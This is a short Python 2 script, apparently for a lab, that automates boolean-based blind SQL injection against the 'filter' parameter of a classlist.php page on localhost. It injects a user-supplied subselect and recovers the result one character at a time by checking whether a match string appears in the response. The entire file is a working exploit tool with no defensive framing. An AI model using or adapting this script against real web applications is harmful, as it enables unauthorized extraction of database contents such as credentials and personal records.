import sys
import urllib2
import urllib
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-m', '--match', required=True,
                    help='String to match of the website when the query is TRUE', dest='match')
parser.add_argument('-s', '--sql', required=True, nargs="+",
                    help='Subselect to run on the database.  Must return a string (use concat and group_concat)', dest='sql')

args = parser.parse_args()
sqlstatement = " ".join(args.sql)

def checkurl(url, matchstring):
    url = urllib.quote(url, safe="/:\\?=+")
    webobject = urllib2.urlopen(url)
    content = webobject.read()
    return matchstring in content

charset = ' \!"#$%&\'(),-./0123456789:;<=>?@[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\r\n\t'
chartotry = 1
done = False
data = ""
while not done:
    for letter in charset:
        url2test = "http://127.0.0.1/classlist.php?filter=504'+and+(ord(lower(mid((" + sqlstatement + ")," + str(chartotry) + ",1)))=" + str(ord(letter)) + ");--+#"
        if checkurl(url2test, args.match):
            data += letter
            # print data
            chartotry = chartotry + 1
            break
        elif letter == charset[len(charset) - 1]:
            done = True
print data
